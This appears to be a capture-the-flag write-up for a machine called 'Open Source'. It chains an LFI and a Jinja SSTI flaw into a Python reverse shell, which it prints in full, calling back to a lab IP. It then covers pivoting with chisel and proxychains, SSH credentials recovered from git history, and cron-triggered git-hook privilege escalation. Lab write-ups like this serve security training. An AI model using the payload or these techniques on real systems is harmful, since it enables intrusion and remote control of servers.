# Open Source

![OpenSource.png](Open%20Source%20/OpenSource.png)

**May 21, 2022**

The code has a capacity to uploads codes and download the application source code: 

![Untitled](Open%20Source%20/Untitled.png)

There are two vulnerabilities, LFI on “/uploads” route and SSTI on “/” route.

![Untitled](Open%20Source%20/Untitled%201.png)

Exploitation of local file inclusion:

![Untitled](Open%20Source%20/Untitled%202.png)

The trick is upload an SSTI malicious payload in “success.html” file obtained from the source code.

![Untitled](Open%20Source%20/Untitled%203.png)

Payload used:

```python
{{"".__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['system']('python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.47\",3301));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\'')}}
```

We are inside a container, doing some tests we found an port on the address “172.16.0.1”.

![Untitled](Open%20Source%20/Untitled%204.png)

Found port.

![Untitled](Open%20Source%20/Untitled%205.png)

Pivoting with chisel socks.

![Untitled](Open%20Source%20/Untitled%206.png)

Chisel socket:

![Untitled](Open%20Source%20/Untitled%207.png)

Proxy chains configuration to work with chisel:

![Untitled](Open%20Source%20/Untitled%208.png)

Run an nmap with proxychains to scan the network and find the GITEA running on the address.

![Untitled](Open%20Source%20/Untitled%209.png)

There are some users:

![Untitled](Open%20Source%20/Untitled%2010.png)

The source code downloaded at the beginning has an git histors:

![Untitled](Open%20Source%20/Untitled%2011.png)

Select the tree:

![Untitled](Open%20Source%20/Untitled%2012.png)

A different file on the directory is the “.vscode” file.

![Untitled](Open%20Source%20/Untitled%2013.png)

Reading the commit we found the password of the dev user:

![Untitled](Open%20Source%20/Untitled%2014.png)

This credentials can be used to login on SSH.

```python
dev01
Soulless_Developer#2022
```

The machine has some crontab commands running every minute, we can craft a exploit using the git hooks inside the .git directory. 

![Untitled](Open%20Source%20/Untitled%2015.png)

### Git hooks webpage

[https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)

IPPSEC video reference: [https://youtu.be/Fxq6oZ-H-xI?t=1574](https://youtu.be/Fxq6oZ-H-xI?t=1574)

In this example we used the pre-commit hook, that is executed when the crontab run the commit command:

![Untitled](Open%20Source%20/Untitled%2016.png)

### POC

Pre-commit file inside the hook folder:

![Untitled](Open%20Source%20/Untitled%2017.png)

Return after run:

![Untitled](Open%20Source%20/Untitled%2018.png)

With this behavior a reverse shell can be spawned.